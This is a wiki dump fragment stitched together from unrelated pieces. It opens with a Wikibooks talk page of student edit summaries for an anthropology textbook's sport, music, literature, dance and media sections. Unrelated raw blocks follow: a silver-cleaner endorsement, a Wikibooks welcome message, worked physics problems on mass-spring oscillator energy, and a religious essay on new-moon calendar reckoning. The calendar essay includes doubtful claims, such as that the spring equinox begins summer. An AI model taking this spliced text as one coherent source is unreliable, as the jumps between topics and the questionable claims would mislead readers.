[[User:Dumass|Dumass]] ([[User talk:Dumass|talk]]) 02:46, 1 May 2009 (UTC)

I added a paragraph at the end in order to wrap up the section and conclude with the idea that preschool is a building block to set the children up for the next 13 or more years of school.

== 2 Sport==
          o 2.1 Sport in Culture
I added few corrections because the person wasnt clear on the different extremes of physical exertion that goes into sports it varies depending on the sport.[[User:Johns586|Johns586]] ([[User talk:Johns586|talk]]) 20:07, 29 April 2009 (UTC)Johns586

I added a section for Taekwondo from my heritage of South Korea. [User: bertscr]

I edited this section by making it more respectful to Germany. [[User:Gorterb|Gorterb]] ([[User talk:Gorterb|talk]]) 04:27, 30 April 2009 (UTC)

I added a few corrections to the spelling and sentence structure in order to make the statements clear. [[acdalm]]

I changed the statements and information regarding football in America and specifically Texas to better show how education is falling behind the fanatics of football. I also eliminated the vague term 'basically' to provide a more clear analysis.[[User:Monron|Monron]] ([[User talk:Monron|talk]]) 04:42, 1 June 2009 (UTC)

I changed parts of this section to show why it is so popular in the US.--[[User:Olsona30|Olsona30]] ([[User talk:Olsona30|talk]]) 20:39, 2 June 2009 (UTC)


I added a few corrections, and I expanded upon one of their passages.[[User:Hillm24|Hillm24]] ([[User talk:Hillm24|talk]])hillm24

I changed replaced the words &quot;girls&quot; and &quot;boys&quot; with &quot;women&quot; and &quot;men&quot; to make the book seem more universal rather than just targeted at certain age groups. [[User:Fishers8|Fishers8]] ([[User talk:Fishers8|talk]]) 01:19, 28 April 2009 (UTC)

I emphasized baseball's cultural influence on the Dominican Republic and explained how it connects Dominicans to the rest of the Caribbean, and ultimately the rest of the world to make this passage more universal. [[User:Nelso81|Nelso81]] ([[User talk:Nelso81|talk]]) 01:46, 29 April 2009 (UTC)
&lt;p&gt;i added a citation of where the information about school and athletes, i couldnet put it in the reference section so i just added it to the paragraph, feel free to fix it if you can[[User:Gentryy|Gentryy]] ([[User talk:Gentryy|talk]]) 00:18, 30 April 2009 (UTC)&lt;/p&gt;

I added a section on what the positive effects of getting involved in sports are. [[User:Hamilt20]]

I edited the section by changing who the athletes/teams represent. [[User:wisemat]]

I edited one of the people's refrence section because it was all messed up and kept repeating their name without and reference citation. [[User:Skolmee|Skolmee]] ([[User talk:Skolmee|talk]])

I added three extra aspects that enhance human qualities of playing the game of soccer because I played soccer for 12 years and these were a huge reward from playing the game.
[[User:Brannaj|Brannaj]] ([[User talk:Brannaj|talk]]) 03:22, 1 May 2009 (UTC)

I added information to the soccer in the Northwest section to clarify.

I added more information to the section about health in America. The reason i felt to add to that section is because it's a major epidemic and something really interesting to learn about. 

          o 2.2 Positive Effect of Getting Involved in Sports

I added &quot;As this general trend of more females participating in sports continues and grows, the boundries for what sports are 'female' or 'male' dominated become blurred. As a female participant in a male-dominated sport (power lifting), I can say that this only promotes equal treatment in sports, but becomes an unlying step towards overall gender equality.&quot; I have been in competition powerlifting for 5 years and set three world records, 3 national records, and 5 state records in benchpress and I am constantly reminded about how gender seperated a lot of sports are still. [[User:Moormas2|Moormas2]] ([[User talk:Moormas2|talk]])

I made this section into a sub section of sports. -Beyerw2

There was a funny sounding sentance that made it sound as if sports themselves were developing discapline. Like they sport was becoming more disaplined not a person. So I took it out and added a statement about sports developing confidence in the area of overcoming hardships. -[[User:Mowryc2|Mowryc2]] ([[User talk:Mowryc2|talk]]) 20:09, 1 May 2009 (UTC)

I changed the last part of the sentence that started with &quot;It’s proven that significant health benefits can be obtained by including 30 min of moderate physical activity...&quot; I changed it from &quot;on most if not all days of the week&quot; to &quot;which must be performed at a minimum of three days per week, and can even be split up into three 10 minute chunks, which will reap the same results as one 30 minute session. However more frequent exercise will certainly lead to more rapid improvements.&quot; I feel that this is a lot more thorough and something that is really important for people to know (that the 30 minutes can be split up). People that struggle with physical exercise may find that three 10 minute sessions to be more their style, therefore it's important for them to know that they can get the same benefits! [[User:Heydril|Heydril]] ([[User talk:Heydril|talk]]) 23:22, 1 May 2009 (UTC)

I made sections to break up the sports categories because it was getting to long and it needed to be broken up into different sections.

          o 2.4 Benefits of a Team
I added a brief paragraph to the beginning of this sub-section to describe and set up the concepts used in the persoanl testimony. [[User:needhaa2|needhaa2]]

I added to the basketball section because I thought that the WNBA part need some additions including how the Houston Comets were the first WNBA dynasty.

I added a paragraph after Benefits of a Team, labeling it Negative Effects of a Team because I felt that although overall being involved with a team and sport is a great experience that helps people grow and learn in a lot of different ways, there are also some negative aspects that should not be overlooked, and had not yet been discussed.

I added my piece in the American Football section because there wasn't really anything that said anything about the NFL and how players get picked to play onto a pro team. I also wanted to share how the NFL is looking to make it more global to try and make more of the world more interested in the American Football. I am also a huge NFL fan so I wanted to give the NFL some love.

I added major league gaming to the sports tab because it is becoming increasing popular, with players being sponsored and prizes in tournaments are increasing well into the tens of thousands of US dollars.

== 3 Cultural Arts==

I added more to this introductory section that I felt was missing from our textbook for requirement 4. 
[[User:ander408|ander408]] ([[User talk:ander408|talk]]) 23:24, 30 April 2009 (UTC)ander408

I edited this section for clarity[[User:Kimiwoodward|Kimiwoodward]] ([[User talk:Kimiwoodward|talk]]) 06:41, 1 May 2009 (UTC)

===3.1 Music===
It seems to me that this section is very Western-centric, as there's really no mention of music originating in the non-Western world, nor is there any mention of music before the 20th century. It seems like it's just a forum for people to talk about the music they like, which isn't the point, nor is it worthy, of an anthropology text. 

I edited the introduction paragraph to the music section and added more specific historical details. I chose to edit this because I felt that a more specific history about how music began and started being recorded would be helpful in trying to understand where it came from. 
[[User:Osbornh|Osbornh]] ([[User talk:Osbornh|talk]]) 06:57, 5 June 2009 (UTC)

I edited the punk section because I felt it was not true about punk rock music. Previously it said that punk songs do not have any meaning in their lyrics, and its all about the show. to correct that I posted a section about what I felt punk music is really about. In that I stated that often punk songs have often political, anti-establishment lyrics.[[User:Culverd2|Culverd2]] ([[User talk:Culverd2|talk]]) 01:15, 2 May 2009 (UTC)

I edited the section of Folk Music, adding in a quote that had to do with Woody Guthrie, who had been mentioned. I thought it could use a little more information on him.  [[User:Kurkok|Kurkok]] ([[User talk:Kurkok|talk]]) 07:05, 1 May 2009 (UTC)
                + 3.1.1 Song and Words

I added a bit more definition to the Indie section because I wanted everyone to be clear that Indie musicians were Independent. [[User:Mazicks|Mazicks]] ([[User talk:Mazicks|talk]]) 20:23, 6 June 2009 (UTC)

I edited the subject matter of the rock music lyrics.  Originally, it was described as generally having risque subject matter but I would have to disagree.  Rock has roots in many genres of music but the blues are a huge part of them.  Songs about being lonely or sad or depressed are not exactly risque.  Granted, huge rock bands like Led Zeppelin have risque music content however there are many, many bands that consider themselves rock that range extensively in terms of what they choose to sing about.  By saying that most rock bands have risque lyrics, it gives a bad impression that is also false.

[[User:Deuelc|Deuelc]] ([[User talk:Deuelc|talk]]) 17:31, 30 April 2009 (UTC)Deuelc

I edited a few sentences in the Rock and Roll part to expand on different influential types of music that helped to form what we now know as Rock and Roll.  I also changed the part which referred covering a song as stealing which is not true.  People cover other artists work all the time and it is very common for musicians to play with other musician's styles.
[[User:Buncht|Buncht]] ([[User talk:Buncht|talk]]) 20:49, 30 April 2009

I added an introductory paragraph under the music section because origionally all there was, was a definition of music and then a list of indepth music catagories. I figured that music itself as a whole should be described and introduced. [[User:Hoytt|Hoytt]] ([[User talk:Hoytt|talk]]) 05:51, 4 June 2009 (UTC)

I edited some of the information about Rap music. Originally, it was stated that Rap music was included &quot;Highly illegal and negative&quot; content, but I feel that this is subjective. Almost every type of music has parts of it that can be considered offensive or not enjoyable by somebody else. Because of this, I changed the line so that is reads that rap has some controversial aspects. [[User:Rosickj|Rosickj]] ([[User talk:Rosickj|talk]]) 00:51, 1 May 2009 (UTC)

I added a quote to the opening information on music. The quote is one I have known for awhile and I felt it fit well because it gives a side to music and dancing as something that anyone and everyone can get into no matter what age or who you are. [[User: Skolmee|Skolmee]] ([[User talk:Skolmee|talk]]) 19:23, 30 April 2009

I also just added some information to the rap section about how it is used a form of protest in areas such as South Africa. Its important that people know this because this is how rap originated and it wasnt meant to degrade women or just talk about money and drugs, but really to try to make a difference and change the way people think. [[User:Skolmee|Skolmee]] ([[User talk:Skolmee|talk]]) 19:56, 30 April 2009

I edited sections of Hip Pop, specifically the origins of Hip Hop because it had not yet been addressed accurately. I also explained that Hip Hop is the incorporation of four different elements that had not yet been addressed either. [[User:jardinj2|jardinj2]] ([[ User talk:Jardinj2|talk]]) 20:23, 30 April 2009 (UTC)jardinj2


I edited the Japanese Hip-Hop section and explained the concept of &quot;genba&quot;. It was such a big conversation in our class and I figured the concept needed to be discussed and explained.[[User:Odlel|Odlel]] ([[User talk:Odlel|talk]]) 04:22, 1 May 2009 (UTC)

I added an entire section entitled &quot;A capella&quot; where I explained what a capella style of singing is and why it is distinct from any other style of vocal performance[[User:Chambem8|Chambem8]] ([[User talk:Chambem8|talk]]) 04:50, 1 May 2009 (UTC)chambem8

I added info to the Folk music section, adding Bob Dylan and Joan Baez [[User:Rennern3|Rennern3]] ([[User talk:Rennern3|talk]]) 06:20, 1 May 2009 (UTC)

I made grammatical corrections to the &quot;rap&quot; section. There were some commas missing, mistyped words, and in one case no word at all. [[User:IngallG|IngallG]] ([[User talk:IngallG|talk]]) 06:24, 1 May 2009 (UTC)

I edit the section regarding country music. The post previously stated that two of the biggest names in country music were Garth Brooks and Elvis Presley. I think that most people consider Elvis to be more of a pop rock icon than a country idol. And, although Garth Brooks is one of the most successful artists of all time, he is not one of the original country artists who influenced the genre.  Instead, I added that Johnny Cash and Hank Williams were the most influential artists in country music because of the way they added passion and real life to their lyrics and performances which influenced the way all music is created and performed. [[User:Olsone23|Olsone23]] ([[User talk:Olsone23|talk]]) 06:35, 1 May 2009 (UTC)

I shifted the folk music section to make it read and flow easier. [[User:McGrawj|McGrawj]] ([[User talk:McGrawj|talk]])

I added to the rap section by specfically adding a new section on west coast rap alone. West Coast rap holds a lot of influence in much of the rap that is around today and the artists that started it all are still recoding and producing music. [[User:Murrayn3|Murrayn3]] ([[User talk:Murrayn3|talk]])

I changed the American Folk Music section to include a modern artist (The Tallest Man On Earth) who is strongly influenced by Bob Dylan. [[Special:Contributions/67.201.211.5|67.201.211.5]] ([[User talk:67.201.211.5|talk]]) 21:54, 1 May 2009 (UTC)

I added a sentence into the punk rock section about how indie music got it start during that time, no one else had mentioned indie music at all yet. I also mentioned Elvis in the rock and roll section as an example of early rock and roll, because the description was right on with the type of music he played. [[User:Tokosk|Tokosk]] ([[User talk: Tokosk|talk]])

I added a few sentences about G-funk to the West Coast Rap section elaborating on why Dr. Dre was as influencial as someone else had stated. And I also took Biggie out of &quot;Later West Coast Rappers&quot;[[User:Tobyreed|Tobyreed]] ([[User talk:Tobyreed|talk]]) 03:06, 2 May 2009 (UTC)

Someone said &quot;Nobody wants to listen to rap that sounds the same as all the other rap&quot; but that person doesn't know that NO ONE would want to. Some people could. So...I changed it to MOST people wouldn't want to listen to rap...

I added one person to the small list of the earliest, most influential blues players because BB King is in many peoples opinion, the most influential blues player to have lived. It would do the rock and roll section injustice to not include his name as an influential musician. [[User:00891778cameron|00891778cameron]] ([[User talk:00891778cameron|talk]]) 06:14, 13 May 2009 (UTC)

I added an &quot;indie&quot; section to the music section, because indie is seen as a genre of music and it is an ever growing genre. I believe it is important to the music scene, because these bands show more passion for their music because they don't focus on trying to make as much money as possible.  ([[User talk:Wisemat|talk]])


I edited the Reggae section because there wasn't a lot of information about what it stood for and also specific instruments used by Reggae artists.

===3.2 Asia Pop Culture===
                + 3.2.1 Japan Idol
                + 3.2.2 Music in the Philippines
                + 3.2.3 Hip Hop
                + 3.2.4 Jamica: The Mento
I edited the last paragraph of the Japan Idol section. Delete some un-need words and instead of just giving a broad view of Japan Idol I was using a specific group as an example to display.[[User:liaoi|liaoi]] ([[User talk:liaoi|talk]]) 09:37, 30 April 2009 (UTC) [[liaoi]]

I edited the section about japan and hip hop because i thought it was important, especially since we just went over it in class last week and we had to read about it in our weekly readings. [[User:Hunters4|Hunters4]] ([[User talk:Hunters4|talk]]) 20:57, 30 April 2009 (UTC)

I edited the the first paragraph of the Music in the Philippines section. I fixed a few spelling errors and changed the sentense structure to make it sound a little bit clearer. [[User:Hamilt20|Hamilt20]] ([[User talk:Hamilt20|talk]]) 04:11, 29 April 2009 (UTC) [[hamilt20]]

I edited the third section of Music, Hip Hop. I wanted to explain the elements of Hip Hop respectively and specifically mention where and why Hip Hop was formed. ([[( User talk: Jardinj2|talk]]) 12:35, 29 April 2009 (UTC) [(jardinj2]]

I added the Jamica:The mento section.[[User:Dragsea|Dragsea]] ([[User talk:Dragsea|talk]]) 03:16, 30 April 2009 (UTC)

I edited a sentence in the Hip Hop paragraph and just reword it to sound better.[[User:Raddenk|Raddenk]] ([[User talk:Raddenk|talk]]) 03:07, 30 April 2009 (UTC) raddenk

I made the revision in the section Hip Hop in Japan because this section was missing critical information. I added to the end of this section information about Ian Condry and the differences between Japanese hip hop and US hip hop and culture.  Ian Condry is a very important anthropologist on this subject and he is not mentioned in this section.  By adding that he was the reason we have all of this information on Japanese hip hop and how it differs from hip hop in the United States, this section became more thorough and accurate.[[User:Hunts2|Hunts2]] ([[User talk:Hunts2:|talk]])

=== 3.2 Literature===
I tried to create some reasoning for why American culture holds some books to a higher significance than others. [[User:Meachaj|Meachaj]] ([[User talk:Meachaj|talk]]) 17:51, 27 April 2009 (UTC)
I just tried to elaborate on how J.R.R. Tolken had influenced others using examples.
[[User:Palomia1|Palomia1]]  ([[User talk:Palomia1|Palomia|talk]]) 28 April 2009 (UTC)
The phrase &quot;many authors of fiction are overlooked but a much of our modern culture can be attributed to these authors&quot; was not very clear, so I reworded it to make sense, while staying true to what I think the original author meant.[[User:Moorez|Moorez]] ([[User talk:Moorez|talk]]) 02:47, 30 April 2009 (UTC) I added the section that lists all the Narnia books in order to add thoroughness to the information on the Chronicles of Narnia. And, I added commentary on the religious aspect of the books because I feel it's necessary to acknowledge the significance of this series that can be enjoyed by such a wide range of readers without raising too much controversy despite the strong Christian themes within the context of the story.[[User:Gordonlesley|Gordonlesley]] ([[User talk:Gordonlesley|talk]]) 08:42, 30 April 2009 (UTC) I added a section explaining how some of Tolkien's books are used as coming of age stories, and how the high fantasy genre seems to follow the Hero's Journey plot line.[[User:Malonep|Malonep]] ([[User talk:Malonep|talk]]) 06:21, 1 May 2009 (UTC)
                + 3.2.1 J.R.R. Tolkien
                + 3.2.2 C.S. Lewis
                + 3.2 Literature


I added more about C.S. Lewis because the current entry only covered one part of his works and I revised the entry to include more about his other works of both fiction and non-fiction to make it more complete.

It was definitely a good idea for the last person to include further books by C.S.Lewis since he wrote many books outside of what is popularly known to people and it should be noted that full comprehension of C.S. Lewis cannot be realized without looking at his other lesser known works. Mentioning The Screwtape Letters was a good addition since the book is classic literature and shows Christian belief in a humorous way.[[User:Gordonlesley|Gordonlesley]] ([[User talk:Gordonlesley|talk]]) 08:11, 3 June 2009 (UTC)

===3.3 Dance===
                + 3.3.1 Dance in Argentina 
I rewrote the second and third sentences to show that the origins of the Tengo were more exotic than one would expect. The original way made it seem as though the dance was only found in the middle class. 
[[User:Heinenj|Heinenj]] ([[User talk:Heinenj|talk]]) 06:59, 1 May 2009 (UTC)

I edited the third sentence to show the readers that the time period which this form of dance originated had a lot to do with why the dance seemed raunchy. [[User:Skaugrk|Skaugrk]] ([[User talk:Skaugrk|talk]]) 19:38, 1 May 2009 (UTC)
                + 3.3.2 Dance in the Philippines
                + 3.3.3 Dance in Zulu and Masai Culture

I added more dances that help athletes skills because these certain types of dances make athletes quickier on their feet.
[[User:Wetlej|Wetlej]] ([[User talk:Wetlej|talk]]) 02:24, 1 May 2009 (UTC)

               + 3.3 Dance, Art or a Sport?

I added a few revisions to different sentences in this section to make the explanations more clear. I also had four different kinds of dance to the dance listing sentence, where I cited &quot;kick&quot; because I was on a Varsity Kick Dance Team in high school and I feel that it is one of the forms of dance that requires the most stamina, strength, and coordination, important as an athlete. 

[[User:Pacheac|Pacheac]] ([[User talk:Pacheac|talk]]) 03:48, 1 May 2009 (UTC)
[[User:Pacheac|Pacheac]] ([[User talk:Pacheac|talk]]) 03:42, 1 May 2009 (UTC)
 
I added that not all dances were completely European influenced and that many dances were significant in other ways. [[User:Paguior|Paguior]] ([[User talk:Paguior|talk]]) 05:36, 1 May 2009 (UTC)

The Native American and dance as art or sport sections were set as sub headings under Zulu and Masai dance so I made them their own categories.I also added the Zulu and Masai section from a paper that I wrote in my African History class.

I added some more information in the section that talked about Capoeira in Brazil. I talked about the African influence and its significance for the slaves during that time.
[[User:Ketchoa|Ketchoa]] ([[User talk:Ketchoa|talk]]) 04:03, 2 May 2009 (UTC)

I added the Ethiopian Dance section, because I felt like Ethiopia had a lot of unique and powerful dances. I'm hoping that people would look at my post and learn more about the dances. Youtube is a great place to look up some of these dances.

=== 3.4 Media===
                + 3.4.1 Sculpture
                + 3.4.2 Painting
                      # 3.4.2.1 Cave Paintings
                + 3.4.3 Television and Film
                      # 3.4.3.1 The Role of Television in Everyday Life of the Family in Serbia
                      # 3.4.3.2 Video and attendance of transnational fiestas

I edited a few sentences and corrected spelling errors, i also added a couple helpful words to clarify what some of the spanish words that were used; just in case people have not taken spanish. [[acdalm]]

I edited a few sentences that had spelling errors and grammatical errors, for Video and attendance of transnational fiestas. [[User:Dragsea|Dragsea]] ([[User talk:Dragsea|talk]]) 03:15, 30 April 2009 (UTC)

I added and corrected a few statistics about television in America. [[hertlee]]

I edited the last paragraph for television in Serbia for grammer and better flow.[[User:Myersh2|Myersh2]] ([[User talk:Myersh2|talk]]) 03:49, 1 May 2009 (UTC)

I added a few sentences regarding the meaning of photography. I also expanded on who Matthew B. Brady was because it was not mentioned before. [[User:Spangler5039|Spangler5039]] ([[User talk:Spangler5039|talk]]) 04:12, 1 May 2009 (UTC)

I added a few famous sculptors and referenced where you could get more information about them 
--[[User:Clevenz|Clevenz]] ([[User talk:Clevenz|talk]]) 05:08, 1 May 2009 (UTC)

I changed the painting section because the sentenced used before mine sounded like a generalization. The person that wrote it used the word we which i felt was a generalization saying that the only people who were reading this section were westerners. I also added that paintings more commonly known from ancient Greek and Rome period as well as Renaissance.

[[User:Buchmak|Buchmak]] ([[User talk:Buchmak|talk]]) 06:27, 1 May 2009 (UTC)Buchmak


I added a section talking about how media influences televison. It is important to know that biases exsit and how they influence as common place as televison. [[User:Murrayn3|Murrayn3]] ([[User talk:Murrayn3|talk]])

I added information on the Mexican mural movement because it was mentioned but not given any detail. [[User:Piersoe3|Piersoe3]]
==Theater==
===Improvisational Theater===
I added the section called Improvisational Theater because I feel that improv exercises encompass play, sport and arts. I then edited my own paragraph a day later because I felt it was too lengthy. It still gets the point across, though. [[User:wildfim]]

      <text xml:space="preserve">Polishing silver: Some of this information is correct but apparently the author hasn't tried EVERY brand of silver cleaner. I have been using a liquid silver cleaner called SilverMate for many years and it has never harmed any of my silver or silver plate.  It is non-hazardous and mild enough to use your bare hands in it and only takes about 20 seconds to clean AND polish all in one step. Research things before you condemn them</text>

Hello, and '''[[Wikibooks:Welcome, newcomers|welcome]]''' to [[Wikibooks]]!

Here are some tips to [[Help|help]] you get started:
* To learn the wiki-markup-language syntax, see [[Help:Editing]].
* Make sure to sign your posts and comments with four tildes, like this: &amp;#126;&amp;#126;&amp;#126;&amp;#126; 
**There is a box at the top of the edit window (if javascript is enabled on your browser) that will insert it too (looks like part of a signature). This will let others know who left it, and make it easy to reply back to you.
* Remember to conduct any editing experiments in the [[Wikibooks:Sandbox|sandbox]].
* You can tell the community something about yourself in your userpage.
** You can get to this page by clicking the tab at the top of the page labeled with your registered username.
* Wikibooks is a collection of open-source textbooks. ([[WB:WIW|What is Wikibooks]]).
* If you are a '''Wikipedian''', see [[Wikibooks:Wikibooks for Wikipedians]] for a primer on how things work here (it's a little different).
** If you want to base your work here on materials from Wikipedia, please use [[WB:RFI]] (requests for importation) to bring the material over in compliance with the GFDL.
* If you're an '''instructor''' and plan on using Wikibooks for a class project, see [[Wikibooks:Guidelines for class projects]]
* Please say hello at the [[Wikibooks:Reading room|Reading Room]] with any questions or ideas.
* Eventually, you might want to read the [[Wikibooks:Manual of Style|Manual of Style]] and [[Wikibooks:Policies and guidelines|Policies and Guidelines]].
** Help us by participating in policy and guideline creation.

There is a small issue with the [[Feminism/Mary Wollstonecraft‎]] page and the use of Wikipedia content (copy-paste) into Wikibooks, license requires that you give attribution to Wikipedia on the book that uses the content or that as transwiki is performed (so to import edit history), you can do the first or undo the last change and request a transwiki (remember also to fix Wikilinks if you can). In any case good luck!  --[[User:Panic2k4|Panic]] ([[User talk:Panic2k4|talk]]) 06:34, 25 April 2009 (UTC)

      <text xml:space="preserve">A mass oscillating on a spring in a gravity-free vacuum has two sorts of energy: kinetic energy and elastic (potential) energy. Kinetic energy is given by:

&lt;math&gt;E_k = \frac{1}{2}mv^2&lt;/math&gt;

Elastic energy, or elastic potential energy, is given by:

&lt;math&gt;E_e = \frac{1}{2}kx^2&lt;/math&gt;

So, the total energy stored by the oscillator is:

&lt;math&gt;\Sigma E = \frac{1}{2}(mv^2 + kx^2)&lt;/math&gt;

This total energy is constant. However, the proportions of this energy which are kinetic and elastic change over time, since v and x change with time. If we give a spring a displacement, it has no kinetic energy, and a certain amount of elastic energy. If we let it go, that elastic energy is all converted into kinetic energy, and so, when the mass reaches its initial position, it has no elastic energy, and all the elastic energy it did have has been converted into kinetic energy. As the mass continues to travel, it is slowed by the spring, and so the kinetic energy is converted back into elastic energy - the same amount of elastic energy as it started out. The nature of the energy oscillates back and forth, but the total energy is constant.

If the mass is oscillating vertically in a gravitational field, the situation gets more complicated since the spring now has gravitational potential energy, elastic potential energy and kinetic energy. However, it turns out (if you do the maths) that the total energy is still constant, although the equilibrium position will be lower.

==Questions==

1. A 10g mass causes a spring to extend 5cm. How much energy is stored by the spring?

2. A 500g mass on a spring (k=100) is extended by 0.2m, and begins to oscillate in an otherwise empty universe. What is the maximum velocity which it reaches?

3. Another 500g mass on another spring in another otherwise empty universe is extended by 0.5m, and begins to oscillate. If it reaches a maximum velocity of 15ms&lt;sup&gt;-1&lt;/sup&gt;, what is the spring constant of the spring?

4. Draw graphs of the kinetic and elastic energies of a mass on a spring (ignoring gravity).

5. Use the trigonometric formulae for x and v to derive an equation for the total energy stored by an oscillating mass on a spring, ignoring gravity and air resistance, which is constant with respect to time.

&lt;math&gt;k = \frac{\Delta F}{\Delta x} = \frac{mg}{\Delta x} = \frac{0.01 \times 9.81}{0.05} = 1.962\mbox{ Nm}^{-1}&lt;/math&gt;

&lt;math&gt;E = \frac{1}{2}kx^2 = 0.5 \times 1.962 \times 0.05^2 = 2.45\mbox{ mJ}&lt;/math&gt;

'''2. A 500g mass on a spring (k=100) is extended by 0.2m, and begins to oscillate in an otherwise empty universe. What is the maximum velocity which it reaches?'''

&lt;math&gt;\frac{1}{2}mv_{max}^2 = \frac{1}{2}kx_{max}^2&lt;/math&gt;

&lt;math&gt;v_{max}^2 = \frac{kx_{max}^2}{m}&lt;/math&gt;

&lt;math&gt;v_{max} = x_{max}\sqrt{\frac{k}{m}} = 0.2 \times \sqrt{\frac{100}{0.5}} = 2.83\mbox{ ms}^{-1}&lt;/math&gt;

'''3. Another 500g mass on another spring in another otherwise empty universe is extended by 0.5m, and begins to oscillate. If it reaches a maximum velocity of 15ms&lt;sup&gt;-1&lt;/sup&gt;, what is the spring constant of the spring?'''

&lt;math&gt;\frac{1}{2}mv_{max}^2 = \frac{1}{2}kx_{max}^2&lt;/math&gt;

&lt;math&gt;k = \frac{mv_{max}^2}{x_{max}^2} = \frac{0.5 \times 15^2}{0.5^2} = 450\mbox{ Nm}^{-1}&lt;/math&gt;

'''4. Draw graphs of the kinetic and elastic energies of a mass on a spring (ignoring gravity).'''

&lt;math&gt;E_e \propto \cos^2 \omega t&lt;/math&gt;

&lt;math&gt;E_k \propto \sin^2 \omega t&lt;/math&gt;

[[Image:Energy_SHM.svg]]

'''5. Use the trigonometric formulae for x and v to derive an equation for the total energy stored by an oscillating mass on a spring, ignoring gravity and air resistance, which is constant with respect to time.'''

&lt;math&gt;x = A\cos{\omega t}&lt;/math&gt;

&lt;math&gt;v = -A\omega\sin{\omega t}&lt;/math&gt;

Substitute these into the equation for the total energy:

&lt;math&gt;\Sigma E = \frac{1}{2}(kx^2 + mv^2) = \frac{1}{2}(k(A\cos{\omega t})^2 + m(-A\omega\sin{\omega t})^2) = \frac{1}{2}(kA^2\cos^2{\omega t} + mA^2\omega^2\sin^2{\omega t}) = \frac{A^2}{2}(k\cos^2{\omega t} + m\omega^2\sin^2{\omega t})&lt;/math&gt;

We know that:

&lt;math&gt;\omega = \sqrt{\frac{k}{m}}&lt;/math&gt;

Therefore:

&lt;math&gt;\omega^2 = \frac{k}{m}&lt;/math&gt;

By substitution:

&lt;math&gt;\Sigma E = \frac{A^2}{2}(k\cos^2{\omega t} + \frac{mk}{m}\sin^2{\omega t}) = \frac{A^2}{2}(k\cos^2{\omega t} + k\sin^2{\omega t}) = \frac{kA^2}{2}(\cos^2{\omega t} + \sin^2{\omega t}) = \frac{kA^2}{2}&lt;/math&gt;

      <comment>/* Celebrating the New Moon */</comment>
      <text xml:space="preserve">==The Scriptual Precedent==
&quot;God said, 'Let there be lights in the expanse of the sky to separate day from night; they shall serve as signs for the set times - the days and the years; and they shall serve as lights in the expanse of the sky to shine upon the earth.' And it was so. God made the two great lights, the greater light to dominate the day and the lesser light to dominate the night, and the stars.&quot; Gen.1:14-16

These two great lights are the sun, and the moon, respectively.  The word for 'set times' here is moedim (appointed times) which is the very word that Yahweh chooses to use to describe His festivals.  One more passage that speaks of these two lights is found in Psalms 104:19:  &quot;He made the moon to mark the seasons; the sun knows when to set.&quot;   

This passage clearly sets the moon apart as the main marker of the seasons, while the sun is to mark the day. The moon that reflects the light of the Sun confirms throughout the month as it waxes and wanes that the created order is not chaotic.  Its visible rebirth each month is very orderly and precise, but not absolutely predictable. Therefore, each month has a degree of expectancy about it. 

==The Ordination of the New Moon==
The months in the Sacred calendar are established as lunar months.  Therefore the sighting of the new moon was ordained to establish the beginning of the monthly cycle and therefore the first day of the month.   The moon's full cycle of illumination lasts a little over 29 days. Thus we have our biblical months of either 29 or 30 days.

The New Moon is a precise astronomical event and can occur on different days because of the rotation of the earth. The determination of the New Moon, therefore, must be determined from the time in which it occurs in Jerusalem to ensure the uniformity of religious worship throughout the world, given increased communication. 

This is based upon scripture which places Jerusalem as the throne of Yahweh (Jeremiah 3:17), the centre-point of the law which will be given under Messiah (Isaiah 2: 3)  through the waters of the Spirit (Zechariah 8:22; 14:8-21). 
God has placed His name there for ever (2 Chronicles 33: 4)
Before the time of modern calendars, the new moon was vitally important as it was the official announcement of when the new month had begun.  Because Yahweh gave commandment to observe the feasts and festivals in their given times it was vital to keep accurate count of when the new month began to celebrate the festivals correctly. 
 
“Yahweh spoke to Moses, saying:  Speak to the Children of Israel and say to them:  Yahweh’s appointed festivals that you are to designate as holy convocations — these are My appointed festivals.”  (Leviticus 23:1-2)   “These are the appointed festivals of Yahweh, the holy convocations, which you shall designate in their appropriate time.”  (Leviticus 23:4). 
 
God is very clear that the festivals are to be celebrated not because they are for man but because they are His appointed times.  These festivals are holy not because man makes them so, but because Yahweh Himself declares them holy.  Since Yahweh is the One who instituted them, it is a reasonable act of worship and obedience to observe them when He designated.

The Sanhedrin, which was the council of elders in Israel, would confirm the sighting of the new moon based upon reliable witnesses and shofars were blown in accordance with the scripture to announce the beginning of the month. 
Today, the rabbinical calendar is based on calculations set up by Rabbi Hillel the second in the mid fourth century. Around this time, the Sanhedrin (the high court of ancient Israel) ceased to exist.  Hillel felt that the New Moon could not be declared visually without a Sanhedrin to affirm its sighting, so he decided it must be calculated.  Rabbis now know that Hillel's calculations were/are off, sometimes as much as two days, which means the festivals are not celebrated on the correct day.  But they have decided to wait until a Sanhedrin is established again to change it. 

==The Ordination of the New Year==
The annual calendar is set by the alignment of both the monthly lunar cycle and the annual solar cycle.  The lunar cycle sets the seasons based on the solar equinoctal cycle.  The moon and sun together are governing signs.
God’s Sacred Year begins with Abib or Nisan (Exodus 12:1-2).
  
&quot;And Yahweh spake unto Moses and Aaron in the land of Egypt, saying,  This month [Abib] shall be unto you the beginning of months: it shall be the first month of the year to you&quot;. (KJV)

This is determined from the New Moon nearest to the spring equinox in the Northern Hemisphere, which begins the summer season,(Note all scholars within the Hebrew Roots believe this statement is totally correct. Herb Solinski who has researched this quite indepth says this should be the new moon crescent on or after the vernal equinox , www.biblicalcalendar.org . At this website you will find his sources quoted in 300 plus pages of documentation) at which time the barley crop will be &quot;in the green&quot; ready for harvest at Passover. This month Abib or Nisan was to be the first of months and, hence, its determination would set the start and finish of the year and, hence, the calendar. The autumnal equinox in the Northern Hemisphere begins the winter season. These are the two seasons mentioned by the Bible which are used to determine the beginning of the year to coincide with the festival harvests.  (Genesis 8:22; Psalm 74:17)    The day of the New Year is to be kept as a solemn feast day.
A record of the festival of the New Moon is found in the Temple Scroll (11Q19-20). In column 14 we see that the sacrifices for the first day of the month, that is the New Moon, are listed, as are the special instructions for the New Year of the first day of the First Month. Thus, the Dead Sea Scrolls quite clearly identify the New Moon of the First Month (Nisan) as the New Year and as a day of solemn assembly and sacrifice. These ordinances are followed by the requirements for the seven day purification of the annual ordination of the priesthood.   This is what column 14 says of the New Year of Nisan:   &quot;On the first day of the [first] mon[th falls the beginning of months; for you it is the beginning of the months] of the year. [You are to do] no work, [You shall offer .. .. ..&quot;

